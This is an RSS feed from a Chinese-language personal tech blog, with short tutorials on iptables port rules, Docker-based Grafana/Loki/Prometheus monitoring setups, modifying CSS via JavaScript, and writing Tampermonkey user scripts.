<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>AC-LM &#39;s blog</title>
        <link>https://ac-lm.github.io/</link>
        <description>Recent content on AC-LM &#39;s blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <lastBuildDate>Wed, 22 Jun 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://ac-lm.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Linux—iptables 开放端口</title>
        <link>https://ac-lm.github.io/posts/linux/linuxiptables-%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3/</link>
        <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxiptables-%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3/</guid>
        <description>&lt;h2 id=&#34;1简介&#34;&gt;1.简介&lt;/h2&gt;
&lt;p&gt;iptables 是集成在 Linux 内核中的网络数据包过滤防火墙系统。iptables 对包的过滤遵循着 &amp;quot; 四表五链 &amp;ldquo;。&lt;/p&gt;
&lt;p&gt;四表：filter 表（过滤规则表）、nat 表（地址转换规则表）、mangle 表（修改数据标记位规则表）、raw 表（跟踪数据表规则表）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;filter 表：控制数据包进出及转发，控制的链路有 INPUT、FORWARD 和 OUTPUT。&lt;/li&gt;
&lt;li&gt;nat 表：控制数据包中的地址转换，控制的链路有 PREROUTING、INPUT、OUTPUT 和 POSTROUTING。&lt;/li&gt;
&lt;li&gt;mangle 表：修改数据包中的原数据，控制的链路有 PREROUTING、INPUT、OUTPUT、FORWARD 和 POSTROUTING。&lt;/li&gt;
&lt;li&gt;raw 表：控制 nat 表中连接追踪机制的启用状况，控制的链路有 PREROUTING、OUTPUT。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;五链：INPUT（入站数据过滤）、OUTPUT（出站数据过滤）、FORWARD（转发数据过滤）、PREROUTING（路由前过滤）和 POSTROUTING（路由后过滤），防火墙规则需要写入到这些具体的数据链中。&lt;/p&gt;
&lt;h2 id=&#34;2使用&#34;&gt;2.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;iptables -nvL &lt;span style=&#34;color:#75715e&#34;&gt;# 查看当前规则&lt;/span&gt;
iptables -L   &lt;span style=&#34;color:#75715e&#34;&gt;# 查看当前规则&lt;/span&gt;
iptables -A INPUT -p tcp --dport &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; -j ACCEPT    &lt;span style=&#34;color:#75715e&#34;&gt;# 开启特定端口输入&lt;/span&gt;
iptables -A OUTPUT -p tcp --sport &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; -j ACCEPT   &lt;span style=&#34;color:#75715e&#34;&gt;# 开启特定端口输出&lt;/span&gt;
iptables -L -n --line-number   &lt;span style=&#34;color:#75715e&#34;&gt;# 显示规则及编号&lt;/span&gt;
iptables -D INPUT &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;#删除编号2的规则&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—Grafana &#43; Loki 搭建日志监控系统</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0grafana-&#43;-loki-%E6%90%AD%E5%BB%BA%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</link>
        <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0grafana-&#43;-loki-%E6%90%AD%E5%BB%BA%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/fwzzzzz/article/details/119003585&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; PLG日志平台搭建: Promtail + Loki + Grafana 全步骤_@dxccccccccccc &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1监控系统组成&#34;&gt;1.监控系统组成&lt;/h2&gt;
&lt;h3 id=&#34;1grafana&#34;&gt;1.Grafana&lt;/h3&gt;
&lt;p&gt;Grafana 是由 Grafana Labs 公司开源的一个监控仪表系统。它可以帮助用户简化监控的复杂度，用户只需提供数据，便可以生成各种可视化仪表。同时还支持报警功能，可以在系统出现问题时通知用户。&lt;/p&gt;
&lt;h3 id=&#34;2loki&#34;&gt;2.Loki&lt;/h3&gt;
&lt;p&gt;Loki 是 Grafana Lab 公司开源的一个水平可扩展、高可用性、多租户的日志聚合系统。提供对日志的收集，建立标签索引的功能，实现对日志的监控。Loki 不主动的监控日志，它仅做收集功能。&lt;/p&gt;
&lt;h3 id=&#34;3promtail&#34;&gt;3.Promtail&lt;/h3&gt;
&lt;p&gt;为了能够监控日志，需要在被监控机上使用 Promtail。Loki 周期性的从 Promtail 暴露的 HTTP 服务地址中拉取监控样本数据。&lt;/p&gt;
&lt;h3 id=&#34;4工作原理&#34;&gt;4.工作原理&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206221443693.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206221443693.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2grafanaloki-安装&#34;&gt;2.Grafana，Loki 安装&lt;/h2&gt;
&lt;p&gt;Grafana，Loki 使用 docker 安装，以避免环境配置的麻烦。注意：需要映射 loki-config.yaml，/var/lib/grafana 目录到宿主机，以便于后续配置（ 映射目录需要赋予权限，不然容器无法读取写入 ）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;wget https://raw.githubusercontent.com/grafana/loki/v2.5.0/cmd/loki/loki-local-config.yaml -O loki-config.yaml
docker run --name loki -d -v &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;:/mnt/config -p 3100:3100 grafana/loki:2.5.0 -config.file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/mnt/config/loki-config.yaml
mkdir /root/grafana
chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;777&lt;/span&gt; /root/grafana
docker run -d -p 3000:3000 --net&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;grafana --name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;grafana --privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true -v /root/grafana:/var/lib/grafana grafana/grafana-oss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;容器正常启动后，访问 IP:9090，IP:3100/metrics，IP/ready，Grafana 默认账号密码 admin-admin，&lt;/p&gt;
&lt;h2 id=&#34;3promtail-安装&#34;&gt;3.Promtail 安装&lt;/h2&gt;
&lt;p&gt;Promtail 的安装可以前往：&lt;a class=&#34;link&#34; href=&#34;https://github.com/grafana/loki/releases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/grafana/loki/releases&lt;/a&gt;，下载对应的二进制文件，解压并执行。注意：需要将配置文件下载至对应文件夹，并指定需要监控的日志文件地址。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;wget https://raw.githubusercontent.com/grafana/loki/v2.5.0/clients/cmd/promtail/promtail-docker-config.yaml -O promtail-config.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4grafana-配置&#34;&gt;4.Grafana 配置&lt;/h2&gt;
&lt;p&gt;在 Grafana 中选择 Loki 数据源，进行 Explore 即可对日志进行查找&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—Grafana &#43; Prometheus 搭建可视化监控系统</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0grafana-&#43;-prometheus-%E6%90%AD%E5%BB%BA%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</link>
        <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0grafana-&#43;-prometheus-%E6%90%AD%E5%BB%BA%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/zongwei/p/13937017.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Prometheus + Grafana搭建可视化监控系统 @ZongweiBai &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/developer/article/1769920&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 一文搞懂Prometheus、Grafana  @yuann &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1监控系统组成&#34;&gt;1.监控系统组成&lt;/h2&gt;
&lt;h3 id=&#34;1grafana&#34;&gt;1.Grafana&lt;/h3&gt;
&lt;p&gt;Grafana 是由 Grafana Labs 公司开源的一个监控仪表系统。它可以帮助用户简化监控的复杂度，用户只需提供数据，便可以生成各种可视化仪表。同时还支持报警功能，可以在系统出现问题时通知用户。&lt;/p&gt;
&lt;h3 id=&#34;2prometheus&#34;&gt;2.Prometheus&lt;/h3&gt;
&lt;p&gt;Prometheus 同样是 Grafana Labs 公司开源的一个时间序列数据库。Prometheus 主要用于对基础设施的监控，包括服务器、数据库、Web服务等。Prometheus 并不直接监控特定的目标的各项指标，比如 linux 系统的各项数据。它主要任务是数据的收集，存储并对外提供数据查询支持，监控数据的获取通过建立与数据源的联系来实现。&lt;/p&gt;
&lt;h3 id=&#34;3exporter&#34;&gt;3.Exporter&lt;/h3&gt;
&lt;p&gt;为了能够监控到某些东西，如主机的 CPU 使用率，需要在被监控机上使用 Exporter。Exporter 是一个相对开放的概念，并不专门指某一个程序。它可以是一个独立运行的程序，独立于监控目标以外 ( 如 Node Exporter，独立于操作系统，却能获取到系统各类指标 ) 。也可以是直接内置在监控目标中的代码 ( 如在项目代码层面接入普罗米修斯 API，实现指标上报 ) 。总结下来就是，只要能够向 Prometheus 提供标准格式的监控样本数据，那就是一个 Exporter，Prometheus 周期性的从 Exporter 暴露的 HTTP 服务地址中拉取监控样本数据。&lt;/p&gt;
&lt;h3 id=&#34;4工作原理&#34;&gt;4.工作原理&lt;/h3&gt;
&lt;p&gt;Grafana，Prometheus，Exporter 间的关系如下图&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206221124598.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206221124598.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2grafanaprometheus-安装&#34;&gt;2.Grafana，Prometheus 安装&lt;/h2&gt;
&lt;p&gt;Grafana，Prometheus 使用 docker 安装，以避免环境配置的麻烦。注意：需要映射 /etc/prometheus，/var/lib/grafana 目录到宿主机，以便于后续配置（ 映射目录需要赋予权限，不然容器无法读取写入 ）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker network create grafana
mkdir /root/prometheus
chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;777&lt;/span&gt; /root/prometheus
docker run -d -p 9090:9090 --net&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;grafana --name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;prometheus --privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true -v /root/prometheus:/etc/prometheus prom/prometheus
mkdir /root/grafana
chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;777&lt;/span&gt; /root/grafana
docker run -d -p 3000:3000 --net&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;grafana --name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;grafana --privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true -v /root/grafana:/var/lib/grafana grafana/grafana-oss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;容器正常启动后，访问 IP:9090，IP:3000，Grafana 默认账号密码 admin-admin&lt;/p&gt;
&lt;h2 id=&#34;3exporter-安装&#34;&gt;3.Exporter 安装&lt;/h2&gt;
&lt;p&gt;Exporter 的安装可以前往：&lt;a class=&#34;link&#34; href=&#34;https://github.com/prometheus&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/prometheus&lt;/a&gt; ，根据需求和被监控机的类型进行选择。以监控 Linux 主机的 Node_Exporter 举例，选择对应的版本下载并解压，进入文件夹后执行&lt;code&gt;./node_exporter&lt;/code&gt; 即可开始监控，可以访问 IP:9100 查看服务运行状态&lt;/p&gt;
&lt;h2 id=&#34;4prometheus-添加被监控机&#34;&gt;4.Prometheus 添加被监控机&lt;/h2&gt;
&lt;p&gt;在目录 /etc/prometheus 中添加配置文件 prometheus.yml ，Prometheus 会根据文件内容对涉及主机进行监控。文件内容如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;global&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;scrape_interval&lt;/span&gt;:     &lt;span style=&#34;color:#ae81ff&#34;&gt;15s&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# By default, scrape targets every 15 seconds.&lt;/span&gt;

  &lt;span style=&#34;color:#75715e&#34;&gt;# Attach these labels to any time series or alerts when communicating with&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# external systems (federation, remote storage, Alertmanager).&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;external_labels&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;monitor&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;codelab-monitor&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# A scrape configuration containing exactly one endpoint to scrape:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Here it&amp;#39;s Prometheus itself.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;scrape_configs&lt;/span&gt;:
  &lt;span style=&#34;color:#75715e&#34;&gt;# The job name is added as a label `job=&amp;lt;job_name&amp;gt;` to any timeseries scraped from this config.&lt;/span&gt;
  - &lt;span style=&#34;color:#f92672&#34;&gt;job_name&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prometheus&amp;#39;&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;# Override the global default and scrape targets from this job every 5 seconds.&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;scrape_interval&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;5s&lt;/span&gt;

    &lt;span style=&#34;color:#f92672&#34;&gt;static_configs&lt;/span&gt;:
      - &lt;span style=&#34;color:#f92672&#34;&gt;targets&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost:9090&amp;#39;&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5grafana-配置&#34;&gt;5.Grafana 配置&lt;/h2&gt;
&lt;h3 id=&#34;a配置数据源&#34;&gt;a.配置数据源&lt;/h3&gt;
&lt;p&gt;选择 Configuration 的 Data Sources，点击 Add data source，选择 Prometheus，在 URL 一栏填写 Prometheus 的 HTTP 访问地址，保存即可。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206221157251.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206221157251.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;b设置面板&#34;&gt;b.设置面板&lt;/h3&gt;
&lt;p&gt;Grafana 提供了官方的 Dashboard 市场：&lt;a class=&#34;link&#34; href=&#34;https://grafana.com/grafana/dashboards&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://grafana.com/grafana/dashboards&lt;/a&gt;，用户可以在里面选择需要的面板，然后在 Grafana 中点击 Import，输入编号添加，如面板 &lt;a class=&#34;link&#34; href=&#34;https://grafana.com/grafana/dashboards/10180&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Linux Hosts Metrics | Base dashboard for Grafana | Grafana Labs &lt;/a&gt;，10180。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206221342648.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206221342648.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;c将面板设为首页&#34;&gt;c.将面板设为首页&lt;/h3&gt;
&lt;p&gt;Grafana 允许将收藏的面板设置为首页，在 Preferences 中设置 Home Dashboard&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206221349818.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206221349818.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web开发—JavaScript 修改 CSS 的三种方法</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91javascript-%E4%BF%AE%E6%94%B9-css-%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</link>
        <pubDate>Mon, 20 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91javascript-%E4%BF%AE%E6%94%B9-css-%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</guid>
        <description>&lt;h2 id=&#34;1stylecsstext&#34;&gt;1.style.cssText&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cssText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;width:250px;height:250px;&amp;#39;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2stylesetproperty&#34;&gt;2.style.setProperty()&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setProperty&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;width&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;250px&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setProperty&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;height&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;250px&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3styleproperty&#34;&gt;3.style.property&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;250px&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;250px&amp;#34;&lt;/span&gt;;     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—油猴 Tampermonkey</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%B2%B9%E7%8C%B4-tampermonkey/</link>
        <pubDate>Mon, 20 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%B2%B9%E7%8C%B4-tampermonkey/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/mukes/article/details/109727662&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 如何开发一个油猴脚本_ @mukes &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是油猴-tampermonkey-&#34;&gt;1.什么是油猴( Tampermonkey )&lt;/h2&gt;
&lt;p&gt;Tampermonkey 是最为流行的用户脚本管理器扩展，它适用于 Chrome，Microsoft Edge，Firefox 等主流浏览器。配合油猴脚本( 用户脚本 / User Script )的使用，可以实现如：为网站添加新的功能；改变网站样式、排版；隐藏网站上烦人的部分内容等功能。&lt;/p&gt;
&lt;h2 id=&#34;2安装油猴-tampermonkey-&#34;&gt;2.安装油猴( Tampermonkey )&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前往官网获取，&lt;a class=&#34;link&#34; href=&#34;https://www.tampermonkey.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Tampermonkey &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;或在各浏览器的扩展商店中搜索 Tampermonkey&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3油猴脚本-user-script-&#34;&gt;3.油猴脚本( User Script )&lt;/h2&gt;
&lt;p&gt;下面是一个默认的 User Script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ==UserScript==
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @name         New Userscript
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @namespace    http://tampermonkey.net/
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @version      0.1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @description  try to take over the world!
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @author       You
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @match        https://blog.csdn.net/mukes/article/details/109727662
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @icon         https://www.google.com/s2/favicons?sz=64&amp;amp;domain=csdn.net
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @grant        none
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ==/UserScript==
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;use strict&amp;#39;&lt;/span&gt;;

    &lt;span style=&#34;color:#75715e&#34;&gt;// Your code here...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;})();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;a元数据&#34;&gt;a.元数据&lt;/h3&gt;
&lt;p&gt;被 &lt;code&gt;==UserScript== &lt;/code&gt;包括的数据被称为元数据，是用来向 Tampermonkey 描述这个脚本的信息。更多：&lt;a class=&#34;link&#34; href=&#34;https://www.tampermonkey.net/documentation.php#metadata&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Tampermonkey • 文档&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ==UserScript==
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @name         编写的油猴脚本名称
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @namespace    命名空间；用来区分名称相同但是作者不同的用户脚本，一般写作者的个人网址或博客地址
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @version      0.1；版本号
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @description  功能描述
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @author       作者
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @match        脚本匹配的网址，支持通配符匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @include      脚本匹配的网址，支持通配符匹配，不安全，会出现警告，建议使用 match
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @exclude      排除匹配到的网址，优先于 include
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @icon         脚本的图标
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// @grant        none 禁用沙盒，使脚本直接在上下文运行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ==/UserScript==
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b用户代码&#34;&gt;b.用户代码&lt;/h3&gt;
&lt;p&gt;函数 &lt;code&gt;(function(){ ... })() &lt;/code&gt;代表立即执行&lt;/p&gt;
